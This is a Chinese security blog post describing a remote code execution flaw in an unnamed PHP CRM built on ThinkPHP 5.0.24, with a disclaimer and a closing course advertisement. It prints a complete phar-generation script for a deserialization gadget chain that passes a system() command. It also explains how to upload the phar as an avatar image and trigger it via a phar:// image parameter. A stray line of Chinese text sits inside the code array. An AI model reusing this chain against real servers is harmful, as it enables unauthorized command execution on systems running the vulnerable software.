#  某CRM系统前台RCE漏洞   
 sec0nd安全   2025-05-08 07:00  
  
**免责申明**  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
#### 一、前言      
###     这是之前的一个库存了，现在发出来大家一期学习，现在官方已经打了相关补丁，一起来学习一下。  
### 二、审计流程  
###      是一个PHP的相关源码，载入源码进行查看架构。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXswEk246yHA9UNLpNSdpAbgWUiaS6iceDrrnribR6ZKOGvdRS1aI2RjjzQ/640?wx_fmt=png&from=appmsg "")  
  
这种架构可以非常明显的看出来是TP框架开发的，我们着重来审计前台RCE漏洞，查看前台的文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXVVicOSEQlCcRbyCPuqoZvs4aJZzLyX7gFr98HhMm1iczMgmHkevdpzOQ/640?wx_fmt=png&from=appmsg "")  
  
在寻找一圈无果之后开始转战别的漏洞，这里先来确定一下TP的版本为5.0.24在这个版本当中存在一个反序列化漏洞，我们根据反序列化漏洞生成phar文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXZREolwUiaPiasMutFkkWVfljkIs4DVpibEQSic9fibqA1BUvfiaMHwNO5PBQ/640?wx_fmt=png&from=appmsg "")  
  
生成代码如下：  
  
```
<?php
namespace League\Flysystem\Cached\Storage{
class Psr6Cache{
private $pool;
protected $autosave = false;
public function __construct($exp)
 {
$this->pool = $exp;
 }
 }
}
namespace think\log{
class Channel{
protected $logger;
protected $lazy = true;
public function __construct($exp)
 {
$this->logger = $exp;
$this->lazy = false;
 }
 }
}
namespace think{
class Request{
protected $url;
public function __construct()
 {
$this->url = '<?= system(\'要执行的命令'); exit(); ?>';
 }
 }
class App{
protected $instances = [];
public function __construct()
 {
$this->instances = ['think\Request'=>new Request()];
 }
 }
}
namespace think\view\driver{
class Php{}
}
namespace think\log\driver{
class Socket{
protected $config = [];
protected $app;
protected $clientArg = [];
public function __construct()
 {
$this->config = [
注册⽤户后上传⽂件
'debug'=>true,
'force_client_ids' => 1,
'allow_client_ids' => '',
'format_head' => [new \think\view\driver\Php,'display'], # 利⽤类和⽅法
 ];
$this->app = new \think\App();
$this->clientArg = ['tabid'=>'1'];
 }
 }
}
namespace {
@unlink('shell.png');
$phar = new Phar("phar.phar"); //
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$c = new think\log\driver\Socket();
$b = new think\log\Channel($c);
$a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
$phar->setMetadata($a);
$phar->addFromString("a", "a"); //添加要压缩的⽂件
$phar->stopBuffering();
}
?>
```  
  
  
然后我们开始找phar反序列化漏洞触发点。  
  
三、phar反序列化触发点  
  
     
 这里师傅们不知道phar反序列化触发点在哪里可以自行百度一下。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXb8yiaicxDjjVZJRDyB8wtg7Y4TmdZZIQCAMez0CSZiciaP15kE1oJXzcMw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXSmLNksjicOVj1VVk1jpPIlWiaVNsVMszojP0eBoD5njSsOJdqtfK6wvw/640?wx_fmt=png&from=appmsg "")  
  
这里我们找到了readfile的触发点，这里虽然判断了后缀，但是不影响，phar反序列化漏洞不会受到后缀的影响，我们寻找哪里调用了这个方法put_image。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXXab9o5r1ia4Ptx6nZBPicfWutEnaJ7HWA8N8cA9ibu5ibOiaCPg3DVqk07A/640?wx_fmt=png&from=appmsg "")  
  
在Controller当中找  
到上述方法，这里我们的参数控制为image参数，现在我们只需要找一个可以上传图片的地方即可，然后调用这个地方的方法，将image变为phar  
://图片地址，即可。  
  
四、漏洞复现  
  
      
在这套源码当中，前台可以直接注册用户，并且进行头像上传（不贴图了，特征太明显了），上传之后我们进行phar反序列化漏洞攻击。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXKlibdUIVdkw0vWrtOVj2CzwN3Aadrm2ws8E6AVnHAAGqAQyzXliaf0kw/640?wx_fmt=png&from=appmsg "")  
  
这里执行的命令是在服务器当中创建一个目录为nishi。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVPCYqASAYYKARGricSicf5nXjXLn2Tb3ZWKp0R6AeIIeBNh95VNtOakR23lmFiaDSH5uF79LqlPpQXQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到成功没创建，至此获得前台RCE漏洞一枚。  
  
五、完结  
  
  
     代码审计第四期，富含PHP、JAVA、NET代码审计，顺带APP、小程序、WEB当中参数逆向以及JAVA工具二开与SRC案例讲解，其中多多0day讲解，实战案例分析，不拿着靶场去做，想学习速速报名了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhUicibrBmrZ2iazoDJic2RyDklw4547e6aNia1OEMntI6wGqRdvr87XVgUdiaiczwW67bRO3iayvd7H7bZoeQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg "")  
  
